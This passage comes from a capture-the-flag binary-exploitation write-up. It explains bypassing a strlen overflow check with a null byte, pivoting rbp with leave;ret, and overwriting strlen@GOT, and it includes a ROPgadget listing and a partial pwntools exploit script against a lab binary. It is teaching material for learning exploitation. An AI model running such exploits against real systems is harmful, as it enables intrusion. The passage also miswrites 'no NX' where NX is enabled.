<p>The application is quite simple, it just prompts the user for input, and reads too much data onto the stack leading to a classic buffer overflow. It then checks the string length to check for a buffer overflow, and if an overflow is detected it <code>exit</code>s so that <code>main</code> doesn&#x27;t return. Otherwise it returns normally.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="protections">Protections<a href="#protections" class="hash-link" aria-label="Direct link to Protections" title="Direct link to Protections">​</a></h3>
<p>Running <code>checksec</code> yields:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    Arch:     amd64-64-little</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    RELRO:    Partial RELRO</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Stack:    No canary found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    NX:       NX enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PIE:      No PIE (0x3ff000)</span><br></span></code></pre></div></div>
<p>So we&#x27;re dealing with pretty standard protections, minus <code>PIE</code>. The lack of canary and <code>PIE</code> will make our overflow feasible, and no <code>NX</code> means no shellcode (oh well, who needs shellcode anyways).</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="intended-solution">Intended Solution<a href="#intended-solution" class="hash-link" aria-label="Direct link to Intended Solution" title="Direct link to Intended Solution">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="disclaimer">Disclaimer<a href="#disclaimer" class="hash-link" aria-label="Direct link to Disclaimer" title="Direct link to Disclaimer">​</a></h3>
<p>The following is my intended solution, however after reading some of the other solutions from other players, I quickly realised that mine was overcomplicated. While they (mostly) used the same techniques that I wanted to cover, they were able to use them in a simpler and more concise way. I will briefly go over a few of them at the end.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="exploitation">Exploitation<a href="#exploitation" class="hash-link" aria-label="Direct link to Exploitation" title="Direct link to Exploitation">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="bypass-strlen-check">Bypass <code>strlen</code> check<a href="#bypass-strlen-check" class="hash-link" aria-label="Direct link to bypass-strlen-check" title="Direct link to bypass-strlen-check">​</a></h4>
<p>The first problem we face is the buffer overflow check, however fortunately for us this is a flimsy check. The string length is the number of bytes before a terminating null byte, however <code>fgets</code> doesn&#x27;t stop us from writing null bytes of our own, so we could place a null byte at the beginning of the buffer to force <code>strlen</code> to return a value less than <code>0x80</code>, hence bypassing the check.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-gadgets">Finding gadgets<a href="#finding-gadgets" class="hash-link" aria-label="Direct link to Finding gadgets" title="Direct link to Finding gadgets">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Gadgets information</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============================================================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401077 : add al, 0 ; add byte ptr [rax], al ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010eb : add bh, bh ; loopne 0x401155 ; nop ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401270 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010b8 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401271 : add byte ptr [rax], al ; add cl, cl ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040115a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401039 : add byte ptr [rax], al ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401272 : add byte ptr [rax], al ; leave ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010ba : add byte ptr [rax], al ; nop dword ptr [rax] ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401044 : add byte ptr [rax], al ; push 1 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401054 : add byte ptr [rax], al ; push 2 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401064 : add byte ptr [rax], al ; push 3 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401074 : add byte ptr [rax], al ; push 4 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401084 : add byte ptr [rax], al ; push 5 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401009 : add byte ptr [rax], al ; test rax, rax ; je 0x401012 ; call rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401273 : add cl, cl ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010ea : add dil, dil ; loopne 0x401155 ; nop ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401157 : add eax, 0x2f0b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401067 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401013 : add esp, 8 ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401012 : add rsp, 8 ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004011d3 : call qword ptr [rax + 0x4855c35d]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401010 : call rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401173 : cli ; jmp 0x401100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401170 : endbr64 ; jmp 0x401100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040100e : je 0x401012 ; call rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010e5 : je 0x4010f0 ; mov edi, 0x404040 ; jmp rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401127 : je 0x401130 ; mov edi, 0x404040 ; jmp rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040103b : jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401174 : jmp 0x401100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010ec : jmp rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401274 : leave ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010ed : loopne 0x401155 ; nop ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401156 : mov byte ptr [rip + 0x2f0b], 1 ; pop rbp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401062 : mov dl, 0x2f ; add byte ptr [rax], al ; push 3 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040126f : mov eax, 0 ; leave ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010e7 : mov edi, 0x404040 ; jmp rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401052 : mov edx, 0x6800002f ; add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401082 : movabs byte ptr [0x56800002f], al ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004011d4 : nop ; pop rbp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010ef : nop ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040116c : nop dword ptr [rax] ; endbr64 ; jmp 0x401100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010bc : nop dword ptr [rax] ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010e6 : or dword ptr [rdi + 0x404040], edi ; jmp rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401158 : or ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040115d : pop rbp ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401036 : push 0 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401046 : push 1 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401056 : push 2 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401066 : push 3 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401076 : push 4 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401086 : push 5 ; jmp 0x401020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401016 : ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401042 : ret 0x2f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401022 : retf 0x2f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401279 : sub esp, 8 ; add rsp, 8 ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401278 : sub rsp, 8 ; add rsp, 8 ; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040100c : test eax, eax ; je 0x401012 ; call rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00000000004010e3 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404040 ; jmp rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000401125 : test eax, eax ; je 0x401130 ; mov edi, 0x404040 ; jmp rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x000000000040100b : test rax, rax ; je 0x401012 ; call rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Unique gadgets found: 68</span><br></span></code></pre></div></div>
<p>Due to the program being compiled to run on glibc versions 2.34 and above, the <code>__libc_csu_init</code> function is <a href="/pwn/pwn/rop-2.34+/the-problem#where-does-pop-rdi-ret-come-from">no longer present</a>, and so most of the useful <code>pop</code> gadgets are gone, like <code>pop rdi ; ret</code>. This stops us using the classic <code>ret2plt</code> attack, where we can call <code>puts</code> on some address containing a libc address, to get a leak. Instead we need to leak libc using ROP in a different way, and for that we need other gadgets.</p>
<p>Most of the gadgets found by <code>ROPgadget</code> aren&#x27;t very useful, except for <code>leave ; ret</code>. This is a gadget found at the end of some functions, like <code>main</code> in this case, which aids in switching between stack frames. It does this by restoring the old <code>rbp</code> of the calling function (saved base pointer), moving <code>rsp</code> up and returning. <code>leave</code> is effectively</p>
<div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mov rsp, rbp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop rbp</span><br></span></code></pre></div></div>
<p><code>rbp</code> here points to the saved base pointer, so moving it into <code>rsp</code> allows it to then be popped into <code>rbp</code>. Then the return address is stored directly afterwards, so then the <code>ret</code> returns to the previous code.</p>
<p>Example (some function called by main):</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        |------------------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |     return address     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |------------------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ----&gt; |   saved base pointer   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |------------------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |                        |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |     char buf[0x80]     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |                        |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |------------------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |     return address     |  &lt;--- [rbp+8]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |------------------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ------|   saved base pointer   |  &lt;--- [rbp]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |------------------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |                        |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |     local variables    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |                        |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |------------------------|  &lt;--- [rsp]</span><br></span></code></pre></div></div>
<p>After <code>leave ; ret</code>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |------------------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |     return address     |  &lt;--- [rbp+8]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |------------------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ----&gt; |   saved base pointer   |  &lt;--- [rbp]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |------------------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |                        |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |     char buf[0x80]     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |                        |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |------------------------|  &lt;--- [rsp]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |     return address     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |     |------------------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ------|   saved base pointer   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |------------------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |                        |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |     local variables    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |                        |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        |------------------------|</span><br></span></code></pre></div></div>
<p>If you want more info, you can go <a href="/pwn/pwn/rop-2.34+/controlling-rbp#what-is-the-saved-base-pointer">here</a>.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="rough-exploit-plan">Rough exploit plan<a href="#rough-exploit-plan" class="hash-link" aria-label="Direct link to Rough exploit plan" title="Direct link to Rough exploit plan">​</a></h4>
<p><code>rbp</code> is used to keep track of where the variables stored in a stack frame are. You can see this in action when looking at the disassembly. The following is from the call to <code>fgets</code>.</p>
<figure><img src="/assets/fgets.png" alt=""><figcaption><p><code>fgets</code> gadget</p></figcaption></figure>
<p>The address of the buffer is relative to <code>rbp</code> (as would other variables, if there were others).</p>
<p>In our buffer overflow, we don&#x27;t only overwrite the return address, but also the saved base pointer, which would then get loaded into <code>rbp</code>, due to <code>leave</code>. So with our overflow, we can control <code>rbp</code>, and we also have the above gadget which writes arbitrary data to the buffer at <code>[rbp-0x80]</code>, so combining these theoretically grants an arbitrary write.</p>
<p>But what to overwrite? Remember we don&#x27;t have a leak, so we&#x27;re limited to the binary&#x27;s memory. Recall that the binary has <code>Partial RELRO</code>, which means the <code>GOT</code> is writable!</p>
<p>An appealing target is <code>strlen@GOT</code>, because it&#x27;s a function that takes one argument: our buffer! So we could either:</p>
<ul>
<li>overwrite <code>strlen@GOT -&gt; puts@PLT</code> and point <code>buf</code> to a <code>GOT</code> entry</li>
<li>overwrite <code>strlen@GOT -&gt; printf@PLT</code> and point <code>buf</code> to a format string</li>
</ul>
<p>Once we have a libc leak, the ret2libc should be trivial, because libc has a <code>pop rdi</code> gadget.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-arbitrary-writes">Getting arbitrary writes<a href="#getting-arbitrary-writes" class="hash-link" aria-label="Direct link to Getting arbitrary writes" title="Direct link to Getting arbitrary writes">​</a></h3>
<figure><img src="/assets/got (1).png" alt=""><figcaption><p><code>GOT</code></p></figcaption></figure>
<p>So to get an arbitrary write onto <code>strlen@GOT</code>, we&#x27;ll need to set <code>rbp</code> to <code>&amp;strlen@GOT + 0x80</code> (since the <code>fgets</code> gadget uses <code>[rbp-0x80]</code>), and <code>rip</code> to the <code>fgets</code> gadget. This is easily done in the first overflow, but then what? Well we&#x27;ll run through the rest of the main function and hit <code>leave ; ret</code> again. Running through what <code>leave</code> does, we see that it copies <code>rbp</code> to <code>rsp</code>, then pops <code>rbp</code> and <code>rip</code>. Since <code>rbp</code> is <code>0x80</code> bytes after our data input, we can use the overflow to control <code>rbp</code> and <code>rip</code> again! (and we can do this for any <code>rbp</code>)</p>
<p>However we run into a problem when going with this approach.</p>
<figure><img src="/assets/writable_memory.png" alt=""><figcaption><p>Writable memory of the binary</p></figcaption></figure>
<p>If we wrote to the earliest possible address <code>0x404000</code>, then <code>rbp = 0x404080</code>. But the entries for <code>stdin</code>, <code>stdout</code>, <code>stderr</code> are between our write and <code>rbp</code>, and since we don&#x27;t have a libc leak, we can&#x27;t overwrite these without corrupting them and causing a crash.</p>
<p>This is why we need to make another write to <code>0x404080</code> first, to fill in a fake saved <code>rbp</code> and <code>rip</code>.</p>
<p>A naive approach to implement the above could look as follows:</p>
<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">e </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./vuln&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./libc.so.6&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">leave_ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">main</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">157</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fgets_gadget </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">main</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">68</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x404080</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overflow </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fgets_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">overflow</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">attach</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fake_rbp_rip  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xdead</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xbeef</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">     </span><span class="token comment" style="color:#999988;font-style:italic"># blank for now!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fake_rbp_rip  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> fake_rbp_rip</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fake_rbp_rip </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x404000</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fake_rbp_rip </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fgets_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">fake_rbp_rip</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwrite  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">puts </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwrite </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">puts</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># strlen@GOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwrite </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">printf </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">overwrite </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">fgets </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">overwrite</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>This will fail for another reason (which isn&#x27;t due to my incompetence (hopefully!)), which is easier to see in gdb.</p>
<figure><img src="/assets/gdb1.png" alt=""><figcaption><p>Before <code>GOT</code> overwrite</p></figcaption></figure>
